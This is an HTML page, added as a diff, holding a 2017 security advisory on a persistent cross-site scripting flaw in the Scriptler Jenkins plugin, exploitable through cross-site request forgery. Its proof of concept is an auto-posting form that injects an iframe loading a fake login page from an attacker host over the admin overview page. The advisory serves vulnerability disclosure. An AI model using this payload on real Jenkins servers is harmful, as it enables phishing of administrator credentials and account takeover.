@@ -1,0 +1,55 @@
+<html> 
+<head> 
+<title>Advisory - Burak Kelebek</title> 
+<link rel="stylesheet" type="text/css" href="../style.css">
+<script src="https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?skin=sunburst"></script>
+ 
+<body> 
+<div id="console"> 
+<center>
+<ul id="menu">
+  <li><a id="c" href="../index.html">Home</a></li>
+  |
+  <li><a id="c" href="../blog.html">Blog</a></li>
+  |
+  <li><a id="c" href="../advisory.html">Advisories</a></li>
+  |
+  <li><a id="c" href="../contact.html">Contact</a></li>
+</ul></center>
+
+<title>Persistent Cross-Site Scripting in Scriptler Jenkins Plugin - Security Advisories and Insights - Burak Kelebek</title>
+<p class="meta">Burak Kelebek, April 2017</p>
+<h1 class="title">Persistent Cross-Site Scripting in Scriptler Jenkins Plugin</h1>
+<p></p>
+<h3>-- Abstract</h3>
+<p>A Cross-Site Scripting vulnerability was found in the Scriptler Jenkins plugin. This vulnerability allows an attacker to perform a wide variety of actions, such as stealing Administrators' session tokens, or performing arbitrary actions on their behalf. In order to exploit this issue, an authenticated attacker has to inject arbitrary HTML in the description of a Scriptler script and wait for an admin to visit the script overview page. By combining this vulnerability with the <a href="https://jenkins.io/security/advisory/2017-04-10/#script-management-vulnerable-to-cross-site-request-forgery-attacks-in-scriptler-plugin">reported Cross-Site Request Forgery</a> vulnerability it is possible for an unauthenticated attacker to exploit this issue by luring an authenticated administrator into visiting a specially crafted page.</p>
+<h3>-- See also</h3>
+<p><a href="https://jenkins.io/security/advisory/2017-04-10/">Jenkins Security Advisory 2017-04-10</a></p>
+<h3>-- Tested versions</h3>
+<p>This issue was successfully tested on <a href="https://wiki.jenkins-ci.org/display/JENKINS/Scriptler+Plugin">Scriptler</a> version 2.9.</p>
+<h3>-- Fix</h3>
+<p>There is currently <a href="https://jenkins.io/security/advisory/2017-04-10/#persistent-cross-site-scripting-vulnerability-in-scriptler-plugin">no fix available</a></p>
+<h3>-- Details</h3>
+<p>The <a href="https://wiki.jenkins-ci.org/display/JENKINS/Scriptler+Plugin">Scriptler</a> Jenkins plugin allows users to store/edit Groovy scripts and execute them on any of the slaves/nodes. Besides administering scripts, Scriptler also provides a way to share scripts between users via hosted script catalogs on the internet.</p>
+<p>A persistent <a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">Cross-Site Scripting</a> vulnerability exists in Scriptler. Administrators are able to submit arbitrary HTML as description of Scriptler scripts that are shown verbatim to other administrators. It is possible to add malicious code in the <em>name</em> field of the <em>scriptAdd</em> function of Scriptler. The malicious code is presented, as part of a newly added Scriptler script, on the overview page of Scriptler. The overview page does not properly HTML encode the value of the <em>name</em> field, allowing for Cross-Site Scripting attacks. This issue can also be exploited using Cross-Site Request Forgery, making it possible for an unauthenticated attacker to inject arbitrary HTML/scripting code by luring an authenticated administrator into visiting a specially crafted page.</p>
+<h3>-- Proof of concept</h3>
+<p>An authenticated user of Jenkins with rights to manage the Scriptler scripts or an anonymous attacker that exploits Cross-Site Request Forgery can inject HTML code within the <em>name</em> field while adding a new script in Scriptler. The proof of concept below will inject an <em>iframe</em> pointing to a fake login page that will be rendered over the overview page.</p>
+<p><code class="prettyprint">&lt;html&gt;<br>
+&nbsp;&nbsp;&nbsp;&lt;body&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;form action="http://192.168.50.90:49001/scriptler/scriptAdd"&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="hidden" name="id" value="asd" /&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="hidden" name="<strong>name</strong>" <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value="<strong>&lt;iframe src=&amp;quot;http://192.168.1.132:1337/foo.html&amp;quot; style=&amp;quot;display:block;background:#FFFFFF;border:none;height:100vh;width:100vw; z-index:999999;position:fixed; top:0px; left:0px; bottom:0px; right:0px;&amp;quot;&gt;&lt;/iframe&gt;</strong>" /&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="hidden" name="comment" value="asd" /&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="hidden" name="script" value="as" /&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="hidden" name="json" value="{&amp;quot;id&amp;quot;: &amp;quot;asd&amp;quot;, &amp;quot;name&amp;quot;: &amp;quot;asd&amp;quot;, &amp;quot;comment&amp;quot;: &amp;quot;asd&amp;quot;, &amp;quot;nonAdministerUsing&amp;quot;: false, &amp;quot;onlyMaster&amp;quot;: false, &amp;quot;script&amp;quot;: &amp;quot;asd&amp;quot;, &amp;quot;&amp;quot;: &amp;quot;asd&amp;quot;}" /&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="submit" name="Submit" value="Submit" /&gt;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/form&gt;<br>
+&nbsp;&nbsp;&nbsp;&lt;/body&gt;<br>
+&lt;/html&gt;</code></p>
+<p>When the attack is successful, the fake login page will be presented to any administrator visiting the Scriptler overview page.</p>
+<p><img src="iframe-login.png" alt="/advisory/SFY20170406/iframe-login.png"></p>
+<p>Figure 1: exploiting Cross-Site Scripting to show a fake login page</p>
+<p>I originally wrote this article for Securify B.V.<a href="https://securify.nl/en/advisory/SFY20170406/persistent-cross-site-scripting-in-scriptler-jenkins-plugin.html"> Read more.</a></p> 			</div>
+		</div>
+</div></body></head></html>
